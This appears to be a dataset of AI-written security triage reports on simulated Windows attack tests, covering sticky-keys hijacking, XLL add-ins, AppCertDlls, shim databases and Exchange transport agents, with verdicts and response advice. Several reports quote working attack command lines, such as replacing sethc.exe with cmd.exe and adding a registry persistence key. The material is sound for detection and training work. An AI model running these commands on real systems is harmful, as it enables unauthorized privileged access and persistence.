1. **CMD.exe Process Execution (Event Record ID: 17982):**
   - The command line execution details suggest an unauthorized modification to the `sethc.exe` file, commonly known for the ""Sticky Keys"" accessibility feature in Windows. The presence of this command often indicates a privilege escalation attempt where `cmd.exe` is copied over `sethc.exe` to gain system access by triggering the sticky keys shortcut at the login screen.
   
   ```plaintext
   CommandLine: ""cmd.exe"" /c IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\sethc.exe /A & icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
   ```

2. **Elevated Integrity Level:**
   - Process executions have a ""High"" integrity level, indicating they were run with elevated privileges. This includes processes initiated by `wsmprovhost.exe`, a process typically related to remote management tasks.
   
3. **Frequent Use of Utilities `whoami.exe`, `hostname.exe`, `wevtutil.exe`:**
   - Such utilities within a short timeframe might indicate enumeration activities where an attacker gathers information about the system and user permissions.

### Analysis of Activities:
- The manipulation of `sethc.exe` is traditionally seen in several attack vectors where attackers aim to establish a persistent foothold or escalate privileges within the system.
- Other background updates related to Microsoft Edge and system processes appear typical for system operations but should be reviewed in the wider context of any anomalous network or user behavior.

### Assessment:
- The command involving `cmd.exe` and `sethc.exe` is highly suspicious and aligns with known privilege escalation tactics often employed in malicious activities.
- Given the identified attempt to modify system critical files with the potential intent for privilege escalation, this activity needs immediate attention.

### Final Resolution:
**MALICIOUS** - The detected actions of altering the `sethc.exe` file with the `cmd.exe` file signify a high-confidence malicious activity, indicating a likely compromise.

### Recommendations:
- **Immediate Actions:**
  - Isolate the affected host (""Server002"") from the network to prevent further potential compromise or escalation.
  - Conduct a thorough malware scan and forensic analysis on the machine to identify any other forms of malware or persistence mechanisms.
  
- **Preventative Measures:**
  - Review and tighten permissions for critical system files such as `sethc.exe`.
  - Implement enhanced logging and alerting for such command line activities and unauthorized file manipulations.
  - Regularly educate users and IT staff on recognizing and reporting security anomalies."
Code Executed Via Excel Add-in File (XLL),"### Detailed Analysis:

Upon analyzing the provided logs, several events stand out that might be indicative of malicious activity or potential compromise.

#### Suspicious Activities Noted:

1. **Repeated PowerShell Execution:**
   - There are multiple instances where `powershell.exe` is being executed. The PowerShell script observed involves creating a COM Object for Excel (`{
   New-Object -COMObject \\""Excel.Application\\""}`). It also attempts to register a DLL using `RegisterXLL`. This activity is often associated with scripting attacks or using Excel as a payload delivery vector, particularly when scripts attempt to load DLLs from unusual directories like `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`.

2. **Multiple Instances of `wevtutil.exe` and `conhost.exe`:**
   - Several instances of `wevtutil.exe` and `conhost.exe` are observed executed by `SERVER002\\admin_test`. While `conhost.exe` is a legitimate Windows process, it being spawned multiple times in conjunction with `wevtutil.exe` (a utility for interacting with Windows event logs) could be indicative of log tampering or activity masking.

3. **Usage of High-Privilege Tokens:**
   - Security log Event ID `4672` indicates special privileges assigned at logon. These privileges include SeDebugPrivilege, SeImpersonatePrivilege, and other system-level privileges. The user `NT AUTHORITY\\SYSTEM` seems to be executing some of these activities.

4. **Suspicious Credential Access Attempts:**
   - Event ID `5379` shows unauthorized or failed attempts to access `MicrosoftAccount` credentials, which could indicate attempts to harvest credentials or test for valid accounts.

5. **Unusual Access to Windows Services:**
   - The logs indicate potential tampering with Windows services through `sc.exe`. This could be used to start, stop, or modify services, which is not typical for normal operations on a CEO's machine unless for maintenance purposes.

6. **Unusual Processes in Temp Directories:**
   - Processes such as `MicrosoftEdgeUpdate` executed from temporary directories (`C:\\Program Files (x86)\\Microsoft\\Temp\\...`) are noticed. Temporary directories are often used by malware for initial drops of payloads before execution.

### Assessment and Resolution:

Based on the provided logs, there are indications of potentially malicious activities:

- The PowerShell script executes with the intent to interact with Excel in a non-standard way, and from a temporary directory, which is often a tactic used in fileless malware or scripts looking to exploit macros or vulnerabilities in Excel.
- Multiple instances of administrative command-line tools (`wevtutil.exe`) and the creation of unauthorized user-like activities indicate potential tampering or activities to cover tracks (like clearing logs).
- Unauthorized attempts to access user credentials could suggest attempts at credential dumping or account checking.

### Resolution: **MALICIOUS**

**Threats/Risks Identified:**
- Possible fileless malware executed through PowerShell.
- Log tampering or access by unauthorized users.
- Potential credential harvesting attempts.

### Guidance on How to Proceed:

1. **Immediate Isolation:** Quarantine the affected machine (CEO's device) to prevent further lateral movement or data exfiltration.
2. **Forensic Analysis:** Conduct a thorough investigation of the PowerShell script by capturing memory and assessing any payloads or scripts dropped in the `AppData` directory.
3. **Credentials Reset:** Immediately reset any potentially exposed credentials and enforce multi-factor authentication for critical accounts.
4. **Review and Update Security Policies:** Ensure that administrative privileges and usage of powerful utilities like PowerShell are logged and monitored. Set up alerts for unusual activities like spawning of excessive `conhost.exe` processes.
5. **Full System Scan:** Run a comprehensive antivirus and anti-malware scan using up-to-date tools on the entire network, focusing on the affected machine.
6. **Review EDR/SIEM settings:** Ensure all logs are being recorded, especially those involving PowerShell and other admin utilities, for any unusual or unauthorized tasks."
Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell,"### Detailed Log Analysis

Upon analyzing the provided Windows event logs, several suspicious activities were observed that warrant further investigation.

#### Suspicious Activities Identified:

1. **PowerShell Activity**:
   - Multiple instances of PowerShell were executed with a specific script modifying registry settings related to ""Trust access to the VBA project object model"" in Word. This script temporarily changes registry settings, creates scheduled tasks, and automatically runs macros. This activity is characteristic of malware trying to persist or execute arbitrary code via macros.

2. **Registry Modification**:
   - The PowerShell script involves registry modification which is often a technique used by adversaries to enable macro execution, allowing them to execute scripts without user consent.

3. **Scheduled Task Creation**:
   - The script creates a scheduled task to open the calculator app (`calc.exe`) daily at a specific time. Although the action itself (opening calculator) might appear non-malicious, creating scheduled tasks without user knowledge is a known persistence mechanism in attacks.

4. **High Integrity Level**:
   - The PowerShell process ran with a high integrity level, which indicates it has elevated privileges. This could imply a privilege escalation attempt or unauthorized use of admin privileges.

5. **Software Update Processes**:
   - Several Microsoft Edge Update processes (both legitimate and with parameters) were observed. While these can be often benign, their timing with the PowerShell activity raises questions about whether they might be used as a disguise or camouflage for malicious activity.

#### Indicators of Compromise:
- PowerShell being used to modify registry keys and create scheduled tasks.
- Execution of PowerShell with a script that is not typical of regular administrator tasks.
- Creation of persistent task scheduled to execute daily.
- Elevated privilege processes running unusual PowerShell scripts.

### Assessment and Resolution

The activities observed in the logs point strongly towards **MALICIOUS** activity. The combination of PowerShell scripts modifying security-related registry settings, creating scheduled tasks, and running with high integrity levels suggests a potential compromise aiming at persistence and unauthorized actions on the system.

### Guidance on How to Proceed

1. **Immediate Containment**:
   - Disconnect the affected machine from the network to prevent further harm or lateral movement.
   - Terminate any suspicious PowerShell or scheduled tasks identified.

2. **Forensic Investigation**:
   - Conduct a thorough investigation into the executed PowerShell scripts and registry changes.
   - Look for additional indicators of compromise on the same machine and potentially on others in the network.

3. **Mitigation Actions**:
   - Evaluate the need for resetting passwords and reviewing user account privileges, especially those with administrative access.
   - Update antivirus and other security solutions and scan the system for malware or unwanted modifications.

4. **Remediation Steps**:
   - Revert any unauthorized registry changes or scheduled tasks.
   - Patch and ensure all security updates are applied to prevent exploitable vulnerabilities.

5. **User Awareness and Training**:
   - Inform and educate users on the risks associated with enabling macros and running unauthorized scripts.

These steps will help contain the current threat, prevent further unauthorized activities, and bolster defenses against similar future incidents."
Simulate Patching termsrv.dll,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior

1. **PowerShell Activity:**
   - A PowerShell script has been executed with the following content:
     - It manipulates ACLs (Access Control Lists) on the `termsrv.dll`, setting them to allow full control by Administrators.
     - The script creates a backup of `termsrv.dll`, modifies its content, and then replaces the original with the backup.
   - Log Entry: 
     ```
     CommandLine: ""powershell.exe"" & {details of the script modifying `termsrv.dll`}
     ```
   - This activity is suspicious because `termsrv.dll` is associated with Terminal Services (RDP) in Windows, and modifying it could indicate attempts to bypass security or create a backdoor.

2. **Time Change:**
   - System time was altered by the svchost.exe process.
   - Log Entries: 
     ```
     EventID 4616 and EventID 1 in Kernel-General
     ```
   - Changing system time can be used to alter the chronology of events for malicious purposes or deceive logging mechanisms.

3. **Privileged Actions with `admin_test`:**
   - The user `admin_test` has multiple logon events with elevated privileges (SeSecurityPrivilege, SeBackupPrivilege, etc.).
   - Log Entries: 
     ```
     EventID 4672 and 4624 showing elevated privileges for `admin_test`.
     ```

#### Potential Indicators of Malicious Activity

- **Elevation and Execution of Scripts:** The use of PowerShell to manipulate system files and change file permissions is a strong indicator of compromise, commonly seen in advanced persistent threats (APTs) where scripts are used to maintain persistence or elevate privileges.

- **Shady Activities with svchost.exe:** The process `svchost.exe` is executing actions typically associated with maintaining system services, but in this context, altering the system's time is highly unusual and suspect.

- **Suspect Logon from External IP:** Security logs indicate NTLM authentication originating from `192.168.0.102` (assumed to be an external workstation not commonly used for administrative tasks), with `admin_test`. This kind of activity might suggest an unauthorized remote access attempt.

### Assessment

The combination of altered sensitive files (`termsrv.dll`), time modification, and the execution of potentially harmful PowerShell scripts indicates a high possibility of system compromise. Moreover, these actions are orchestrated under the guise of an administrative user, pointing towards either insider threats or successful credential theft.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Containment:**
   - Disconnect the affected system (Server002) from the network to prevent further spread or exfiltration of sensitive data.
   - Initiate a full system scan using updated antivirus software with signature and behavioral detection.

2. **Investigation:**
   - Reset passwords and review access policies for critical accounts, especially `admin_test`.
   - Inspect the last known modifications to `termsrv.dll` and confirm unauthorized changes.
   - Conduct a detailed forensic analysis of System and Security event logs to trace potential user actions or exploited vulnerabilities.

3. **Prevention:**
   - Implement strict access control policies and monitor privileged activities.
   - Employ a more robust solution for the detection of anomalous behavior, such as advanced EDR solutions with machine learning capabilities.
   - Regularly update and patch systems, ensuring all Windows hosts are secured against known vulnerabilities, especially those related to PowerShell and RDP.

This detailed analysis and action are necessary to secure the environment from future similar threats and ensure the integrity of the system remains intact."
Install and Register Password Filter DLL,"Upon examining the provided Windows event logs, the following analysis highlights suspicious behavior that could potentially indicate malicious activity:

1. **PowerShell Command Execution:**
   - The Windows PowerShell logs indicate unusual PowerShell script execution with extensive registry modification activities. Specifically, a PowerShell script is seen modifying the registry under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\` to potentially install a custom password filter (`filePWFilter.dll`). This behavior is highly suspicious as it could be intended to capture or manipulate password data.

2. **Registry Key Modifications:**
   - The Sysmon logs corroborate the execution of possibly harmful PowerShell commands involving `reg.exe`. This includes exporting the LSA registry hive and copying a DLL (`filePWFilter.dll`) to the `System32` directory, followed by modifying the registry to include this DLL in the Notification Packages. Such actions are typically associated with credential theft or persistence mechanisms.

3. **Privileged Process Executions:**
   - The Sysmon logs also show several highly privileged operations being conducted by `SERVER002\\admin_test` and various SYSTEM user accounts, further supporting the suspicion of unauthorized activity.

4. **Security Logs:**
   - Multiple Logon events with elevated tokens and a comprehensive list of privileges being assigned. Event IDs `4624` and `4672` indicate potential misuse of SYSTEM privileges which could be associated with an attempt to maintain persistent administrative access.

5. **Lack of Legitimate Parent Process Information:**
   - In some Sysmon logs, there is a lack of information about a legitimate parent process for certain newly spawned processes, which could be indicative of process masquerading or execution in a non-standard manner.

Considering the combination of registry modifications, privilege escalation attempts, potential password filter injection, and the context of these actions on a machine associated with the CEO, this case contains clear indicators of malicious activity.

**Resolution: MALICIOUS**

**Guidance:**
- Initiate an immediate containment response on the affected host to prevent further unauthorized access or data compromise.
- Conduct a forensic memory analysis and disk examination to identify any additional artifacts or malware.
- Verify integrity and restore the LSA registry hive to a known good state.
- Audit all sensitive accounts and reset passwords, particularly on high-privilege accounts like those on the CEO's machine.
- Review and enhance EDR and SIEM rules to detect similar behaviors in the future.
- Engage the incident response team for comprehensive remediation and follow-up actions.
"
Application Shim Installation,"In analyzing the provided Windows event logs, several points of interest and potential concerns can be highlighted based on the observed activities:

1. **PowerShell Execution**: The execution of `powershell.exe` by the user `SERVER002\admin_test` was noted. PowerShell is a powerful tool that can be leveraged by both legitimate administrators and malicious actors. However, without additional context or command-line arguments, it is difficult to determine if this specific instance is malicious.

2. **Usage of `wevtutil.exe`**: The repeated execution of `wevtutil.exe` by the same user may indicate potential tampering with event logs, which is a common tactic used to cover tracks after a compromise. It could also be legitimate administrative activity, though in the context of an alert, it warrants further inspection.

3. **Execution of `cmd.exe` with `sdbinst.exe`**: An unusual command-line execution in a temporary directory suggests the installation or modification of application compatibility settings, potentially leading to system or application behavior modification. This type of activity can be used for persistence or to bypass security features.

4. **Microsoft Edge Update Activities**: Numerous activities related to Microsoft Edge Update processes under `NT AUTHORITY\SYSTEM` context, including `MicrosoftEdgeUpdate.exe` and associated components, were observed. These can be routine update processes; however, the concurrent execution of different update components raises questions about the context and frequency.

5. **Usage of `whoami.exe`**: While `whoami.exe` is a benign tool, its invocation aligns with manual investigations into system state or identity, possibly indicative of reconnaissance post-initial access.

6. **Execution Context**: Many processes run at high integrity levels with both administrative users and system authority, which means any malicious payload would have elevated privileges.

7. **Event Record Patterns**: The logs indicate clusters of grouped executions that may suggest automated or scripted behaviors, which may or may not be routine, but they accentuate the need for filtering normal from abnormal activities based on historical baselines.

### Conclusion:

Considering the above points, while there are no direct, definitive indicators of compromise (such as known malicious hashes, clear privilege escalation, or data exfiltration attempts), several events are potentially concerning due to their context, frequency, and nature (particularly the use of `wevtutil.exe`, `sdbinst.exe`, and the presence of many Edge Update processes rapidly executed).

### Resolution:
- **SUSPICIOUS**: The activities observed in the logs merit further investigation to confirm whether they are authorized administrative actions or indicative of potential compromise. Further context such as additional log data, historical patterns, user behavior analysis, and system configurations will help in determining their legitimacy.
  
### Guidance:
- Cross-reference these events with additional context such as network traffic, alerts from other security tools (e.g., EDR), similar past events, and a timeline of known legitimate administrative actions.
- Conduct interviews or checks with the system's usual operators (or the IT team) to verify the legitimacy of these activities.
- Implement closer monitoring on the machine to capture more granular data, including invoked command-line arguments and network connections initiated by these processes.

In all cases, it’s crucial to keep the security teams informed and prepared to isolate or mitigate potential threats promptly."
WMI Invoke-CimMethod Start Process,"Upon analyzing the provided Windows event logs, several points of interest emerge that could indicate potential suspicious or malicious activity:

1. **Event ID 4616 and 1 (Security & System Logs):** There are logs of the system time being changed, as evident from Event ID 4616. This action by `svchost.exe` under `LOCAL SERVICE` could potentially hide malicious activity by backdating event timestamps, although time synchronization services like Windows Time service can cause similar logs. Further investigation is required to confirm the intent and necessity of these changes.

2. **Event ID 4672 (Security Log):**
   - `admin_test` was assigned a large number of privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`, which are high-level privileges that should be closely monitored as they can enable full control over the system and processes, often an indicator of potential misuse or malicious escalation attempts.

3. **Event ID 4624 and 4634 (Security Log):**
   - The `admin_test` account logged on and off using NTLM authentication. While NTLM is legitimate, its use over more modern protocols like Kerberos can be a sign of potential lateral movement. The presence of NTLM could be typical in some environments but should be further reviewed, particularly if the account activity is unexpected.

4. **Sysmon Event IDs:**
   - There was execution of `wevtutil.exe` and `conhost.exe` by `admin_test`. While these utilities are legitimate administrative tools, they can be used for malicious purposes such as reading logs or executing commands via console redirection. Frequent invocation of these utilities could be suspicious, particularly if unplanned or outside the usual behavior for `admin_test`.

5. **Powershell Execution (PowerShell Log):**
   - A Powershell script executes to run `calc.exe` via a CIM session with `localhost`. While launching `calc.exe` isn't inherently malicious, such script execution and unnecessary remote sessions can be indicative of testing or malicious commands shelled out over legitimate channels.

**Assessment:**
- **SUSPICIOUS:** The combination of high privileged access grants, NTLM authentication, `wevtutil` usage, and Powershell scripts invoking processes reflects patterns that can be attributed to potential reconnaissance, privilege escalation, and lateral movement activities. Given the high-level privileges and the possible tampering with system times, there is a need for further investigation to determine the legitimacy and scope of these activities.

**Guidance:**
- Review the system's security policies, especially around the high permissions assigned to `admin_test`.
- Investigate the necessity and frequency of time changes in system logs.
- Examine the legitimacy of remote Powershell script executions and NTLM usage.
- Conduct a broader review of logs surrounding the targeted timeframe for other indications of lateral movements or data exfiltration.
- Engage key stakeholders such as IT and management to assess any sanctioned changes that may align with these logs."
Create registry persistence via AppCert DLL,"Upon reviewing the provided logs, I noticed a sequence of activities that stand out as suspicious and could potentially indicate malicious behavior:

1. **PowerShell Execution with Suspicious Activities:**
   - There is a PowerShell command executed with the intention of copying a potentially malicious DLL (`fileTest.dll`) to a public directory and adding a registry key under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls`. The AppCertDlls registry key is often targeted by attackers to load malicious DLLs into every spawned process, which can be used for persistence or privilege escalation.

2. **Command Details:**
   - The registry modification command suggests an unauthorized attempt to manipulate the system registry:
     ```
     ""powershell.exe"" & {Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.009\bin\fileTest.dll"" C:\Users\Public\fileTest.dll -Force, 
     reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""fileTest"" /t REG_EXPAND_SZ /d 
     ""C:\Users\Public\fileTest.dll"" /f}
     ```

3. **Process Execution Context:**
   - The actions are performed under the `SERVER002\admin_test` user, which has high integrity level privileges, further raising the concern that these processes were executed by a user with significant system access.

4. **Conhost.exe and Additional Process Creations:**
   - The frequent invocation of `conhost.exe` around the same timestamp is typically normal as it's used by the console for command line processes. However, in conjunction with suspicious PowerShell activity, it warrants further review, particularly to understand whether they might be facilitating the suspicious behavior.

5. **Wevtutil.exe Use:**
   - The presence of `wevtutil.exe` could indicate attempts to interact with the event logs. Attackers sometimes use it to clear logs post-attack, which is another potential indicator of compromise.

**Assessment and Guidance:**
These activities, particularly the manipulation of the AppCertDlls registry key combined with the nature of the executed PowerShell command, are consistent with potential malicious behavior, possibly revealing an attempt to establish persistence or execute unauthorized code on the system.

Based on the suspicion of an intrusion or compromise:

- **Resolution:** MALICIOUS

**Recommended Actions:**
- **Immediate Isolation:** Isolate the affected machine from the network to prevent further potential spread or impact.
- **Thorough Investigation:** Conduct a full forensic analysis on the machine to gather more evidence of compromise, understand the origin, and assess the extent of the intrusion.
- **Registry and File Scan:** Examine changes to the registry and look for unauthorized DLL files or binaries on the system.
- **Log Review:** Continue reviewing logs for any anomalies or links to potential network activity indicative of the compromise.

Implement these steps to contain and eradicate the threat, while continuously monitoring for further anomalies across the network."
Persistence via WMI Event Subscription - CommandLineEventConsumer,"After analyzing the provided Windows event logs, here is a detailed assessment:

### System Log
- **Kernel-General Events (Event ID 24, 1):** These events reflect typical system time change events and show no signs of anomaly by themselves, especially given that they're invoked by `svchost.exe`, a legitimate Windows system process.
- **Time Service (Event ID 35):** Confirmed usage of time.windows.com as a time source is normal behavior for systems syncing time via NTP.

### Security Log
- **Logon Events (Event IDs 4624, 4672):** These entries represent a successful logon session and token elevation for the `SYSTEM` account. Logon type 5 indicates a service logon, which is typical for background services.
- **Time Change (Event ID 4616):** Involves time-change actions by the `LOCAL SERVICE`. This corresponds with system time synchronization activities seen in Kernel-General events and doesn't appear suspicious on its own.

### Windows PowerShell Log
- **PowerShell Events (Event ID 600):** Indicate potentially suspicious activity with a script involving WMI Persistence via `CommandLineEventConsumer`. PowerShell uses commands that suggest the establishment of persistence mechanisms. The use of WMI filters and consumers is a known technique leveraged by malware to maintain persistence.

### Application Log
- **Security-SPP, edgeupdate Events:** Reflect routine service activities and EdgeUpdate service operations, indicating no overt suspicious activity. However, further correlation with unusual PowerShell activities is warranted.

### Sysmon Log
- **Processes Execution (Event ID 1, 5):** Numerous instances of legitimate Windows processes (e.g., `conhost.exe`, `wevtutil.exe`, `whoami.exe`) executing without immediately apparent suspicious command-line arguments.
- **PowerShell Execution (Event ID 1):** Execution of `powershell.exe` shows a complex command line akin to persistence-related activities noted in Windows PowerShell logs. This strengthens the suspicion of WMI-based persistence attempts.

### Suspicious Indicators
1. **PowerShell Usage:** The use of complex PowerShell commands linked to WMI persistence is a significant red flag. Execution of scripts that interact with system services, particularly involving `CommandLineEventConsumer`, needs immediate scrutiny and is indicative of potential malicious persistence mechanisms.
   
### Risk and Threats
The logs present evidence suggesting an adversary might be attempting to establish or has established persistence via WMI Event Consumer scripts utilizing PowerShell. This technique is frequently applicable in maintaining foothold in compromised environments and could facilitate unseen lateral movement or data exfiltration.

### Recommendation and Conclusion
- **Resolution: SUSPICIOUS** - The activities, particularly around PowerShell and WMI, necessitate further investigation. Investigate the initiation source of the PowerShell commands and any associated scripts. Assess the integrity of critical system files impacted by these activities.
- **Next Steps:** Conduct a threat-hunting exercise for lateral movement indicators, considering any other unusual scheduled tasks or unknown processes/services. A full review of network traffic for the machine during this timeframe may reveal related communication with suspicious external hosts.
- Consider measures like isolating the affected host, reviewing persistence mechanisms, and running endpoint security solutions to detect and remove additional threats.

This analysis suggests elevating monitoring and possible incident response procedures to counter and mitigate risks associated with observed suspicious activities."
New shim database files created in the default shim database directory,"Based on the analysis of the provided Windows event logs, here are the key findings:

### Analysis:

1. **Windows PowerShell Log Analysis:**
   - There are repeated PowerShell commands involving `Copy-Item` that are copying a file `data.011CompatDatabase.sdb` from a temporary directory to `C:\Windows\apppatch\Custom\` and `C:\Windows\apppatch\Custom\Custom64\`.
   - This behavior is suspicious as it involves copying files into system directories which could be a step associated with privilege escalation or persistence.

2. **Sysmon Log Analysis:**
   - There is evidence of the `whoami.exe` and `wevtutil.exe` executions. `whoami.exe` checks the identity of the user, possibly used to confirm admin rights, which might be a prelude to malicious activity.
   - The usage of `wevtutil.exe` with the command `epl` (Export Log) to save logs to a temporary location could be an attempt to cover tracks or steal logs for exfiltration.
   - Multiple instances of `conhost.exe` associated with PowerShell and `wevtutil` operations. While `conhost.exe` itself isn't inherently malicious, its frequent involvement in conjunction with potential malicious activity raises red flags.

3. **Application and System Logs:**
   - Logs from the Software Protection Platform Service (`sppsvc.exe`) appear routine and related to process servicing, showing normal system operations without evidence of tampering related to the suspicious activities indicated in the PowerShell commands.

### Assessment of Situation:

- The combination of these activities suggests potential malicious behavior. The copying of potentially malicious `.sdb` files into system directories, combined with the suspicious use of `wevtutil.exe` to export logs, could point towards malicious intent, possibly to establish persistence and hide further activity.
- While not all individual actions are directly malicious, the context in which they occur, on a server machine, and specifically targeting directories typically associated with system-level changes, signals a strong possibility of compromise.

### Threats/Risks Identified:

- **Unauthorized Access or Privilege Escalation:** The modification of system directories could enable persistent access or privilege elevation.
- **Log Manipulation:** Exporting logs might mean an attempt at hiding tracks or preparing for further exploitations.

### Guidance on How to Proceed:

- **Immediate Isolation:** The affected machine should be isolated from the network to prevent potential lateral movement or data exfiltration.
- **Comprehensive Scanning:** Perform a full antivirus and anti-malware scan on this machine to identify and mitigate any threats.
- **Investigate File Integrity:** Perform a file integrity check on the `apppatch` directories to authenticate any unauthorized changes.
- **Examine User Access:** Audit user access logs to analyze any abnormal behavior or access patterns.
- **Review EDR Policies:** Strengthen EDR policies to monitor and alert similar occurrences in the future.

**Final Resolution: MALICIOUS** - The combination of evidence within these logs suggests activities consistent with a potentially malicious compromise that requires prompt attention and remediation."
Load custom DLL on mstsc execution,"Upon reviewing the provided Windows event logs, I have identified certain activities that could potentially raise red flags. Here's a detailed analysis of these logs:

1. **System Log**:
   - The system log entries primarily document time changes and interactions by `svchost.exe`, indicating potential legitimate time adjustments. There are no direct indicators of malicious activity in these entries, as time synchronization with `time.windows.com` is a normal system process.

2. **Sysmon Log**:
   - The execution of `cmd.exe` with the command line ""reg add"" to modify the registry path `HKLM\SOFTWARE\Microsoft\Terminal Server Client` to include `C:\Windows\System32\amsi.dll`. This activity stands out as potentially suspicious because:
     - Registry modifications, especially involving DLL paths, can be indicative of persistence mechanisms often employed by malicious actors.
     - `amsi.dll` is part of the Windows Anti-Malware Scan Interface, and altering its path could suggest an attempt to subvert its functionality.

   - Numerous activities involving `MicrosoftEdgeUpdate.exe` and related components like `MicrosoftEdgeUpdateSetup.exe` that are consistent with update processes for Microsoft Edge. While these are generally benign, given the context of Edge updating, a thorough check for unusual network activity or non-standard update times might be prudent if suspicions arise.

3. **Security Log**:
   - The Security log indicates entries for time changes processed by `svchost.exe`, commonly associated with system updates or synchronization, again aligning with routine events.

**Assessment**:
- The execution of system tools like `REG.EXE` to modify registry entries related to critical system DLLs without sufficient context or authorizations suggests potentially unauthorized or suspicious activity. This kind of registry modification could be an attempt to achieve persistence or evade detection by security software.

**Conclusion**:
Based on the analysis, I classify the status of this activity as **SUSPICIOUS**. Although many events appear routine, the registry modification combined with the lack of context warrants further investigation to rule out malicious intent.

**Guidance**:
- Conduct a deeper investigation into the `cmd.exe` and `reg.exe` processes to determine the source and authority of these commands.
- Review related user activity leading to and around these events for unauthorized access attempts.
- Consider deploying additional security monitoring focused on registry changes and persistence techniques.
- Verify the integrity and version of the `amsi.dll` file and ensure that its correct path and operations remain unaltered.

While there's a likelihood of a benign explanation for the observed activity, the potential risk necessitates additional scrutiny to safeguard the environment effectively."

1. **Logon Events (4624 and 4672)**:
   - Multiple successful logon events (EventID: 4624) by the SYSTEM user account (""TargetUserName"": ""SYSTEM"", ""TargetDomainName"": ""NT AUTHORITY"") with logon type 5, which indicates a service logon. This is typically benign and common behavior for services running under the SYSTEM account.
   - Privilege use events (EventID: 4672) show SYSTEM having privileges like SeDebugPrivilege, SeTcbPrivilege, etc. These are standard high privileges for the SYSTEM account and by themselves are not indicative of malicious activity.

2. **Credential Validation Events (5379)**:
   - Several attempts to validate Microsoft Account and Windows Live credentials with a return code of 3221226021, suggesting they failed. These look-ups can occur in regular operations, especially if services are attempting to access cloud-based or secured resources.

3. **Process Execution (Sysmon ID: 1 and 5)**:
   - Several process creations involving `powershell.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` by `SERVER002\\admin_test`. The usage of these executables in automated sequences or scripts could indicate administrative tasks, but they warrant further investigation, especially the PowerShell usage, due to its frequent use in attacks.
   - The command line in `cmd.exe` shows a registry file import, which is often used in configuration changes or potential persistence setups.

4. **EdgeUpdate Executions**:
   - A series of executions for `MicrosoftEdgeUpdate.exe` processes, usually related to the Microsoft Edge automatic updates. While frequent executions can indicate normal updating behavior, the variety of command line parameters used (e.g., `/svc`, `/update`, `/ua`) should be aligned with standard operations to rule out misuse.

5. **Administrative Task Execution**:
   - Observations of `taskhostw.exe` execution, which appears normal if associated with task scheduling or service hosting as indicated in the logs.

6. **Concerns**:
   - Anomaly in the sequence and frequent automation tools (`PowerShell`, `whoami`, `reg.exe`) usage by `admin_test`, particularly from a user context with high integrity level.
   - The import of registry files and PowerShell usage is a common tactic in compromise scenarios. Further contextual analysis (e.g., correlating with network telemetry, EDR data) is necessary to ascertain intent or potential persistence mechanisms.

### Assessment and Recommendation:
- **SUSPICIOUS**: The combined observations of command execution patterns, credential validation failures, and registry modification attempts suggest activities that could be part of normal administrative routines but stand out as unusual if not originally intended or authorized.
- **Guidance**: Conduct further investigation involving:
  - Verifying the legitimacy of the `admin_test` account and its activity.
  - Inspecting the content and purpose of the registry file import.
  - Correlating these logs with network, endpoint, and antivirus/EDR data to identify potential unauthorized access or changes.

Persistent Code Execution Via Excel Add-in File (XLL),"Upon analyzing the provided logs, several entries suggest potentially suspicious activity that warrants further investigation. Here are the key findings:

1. **PowerShell Activity**:
   - The Windows PowerShell log entry shows a script executing commands that manipulate Excel add-ins, specifically copying files to the `$env:APPDATA\Microsoft\AddIns\` and modifying the `Excel` registry options to execute a specific `.xll` file on startup. This action can be indicative of a known attack vector involving misuse of Excel add-ins (e.g., using `.xll` files for malicious purposes). The usage of PowerShell for these operations is suspicious, especially when combined with the registry manipulations to ensure the persistence of the action.

2. **Sysmon Logs**:
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and other related executables (`MicrosoftEdgeUpdateComRegisterShell64.exe`, etc.) are observed, which could be normal due to system updates. However, their timing and frequency, especially around the time of the PowerShell execution, suggest that these processes might be leveraged for maintaining persistence or achieving privilege escalation.
   - The presence of `hostname.exe`, `whoami.exe`, and several `conhost.exe` instances alongside PowerShell execution indicates possible reconnaissance or attempts to gather system/user information for further exploitation.

3. **Potential Threats**:
   - The PowerShell script modifies registry entries related to Office applications, which could be indicative of trying to exploit Office macros or add-ins for malicious purposes.
   - The script's attempt to determine whether a 32-bit or 64-bit version of Excel is installed could be used to ensure compatibility of the payload across environments.

**Assessment**:
The behavior observed is more aligned with common threat behaviors rather than normal operational activities. The combination of PowerShell script execution, registry modifications, and potential leveraging of a common application (Excel) for executing payloads indicates a possibility of a malicious attack vector.

**Recommendation**:
- Isolate the machine in question (Server002) from the network to prevent further potential exploitation.
- Conduct a thorough investigation into the source of the PowerShell script and its potential dropper.

Install MS Exchange Transport Agent Persistence,"### Analysis of Logs:

Upon reviewing the provided logs, several suspicious activities were identified that could suggest potential malicious behavior:

1. **Privilege Escalation:**
   - In the security log, event ID 4672 shows that the account `admin_test` was granted special privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, and others such as `SeTakeOwnershipPrivilege`, which can be indicative of privilege escalation. In particular, `SeDebugPrivilege` can be used to operate and debug any process, often seen associated with malicious activities.

2. **Suspicious PowerShell Commands:**
   - The PowerShell logs indicate that a script was executed to install a transport agent relating to Microsoft Exchange with the command: 
     ```plaintext
     powershell.exe & {Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
     Enable-TransportAgent Security Interop Agent
     Get-TransportAgent | Format-List Name,Enabled}
     ```
   - This type of activity is particularly concerning if unexpected, as it involves modifying the Exchange Server configuration, often a target for attackers aiming to backdoor or exfiltrate emails.

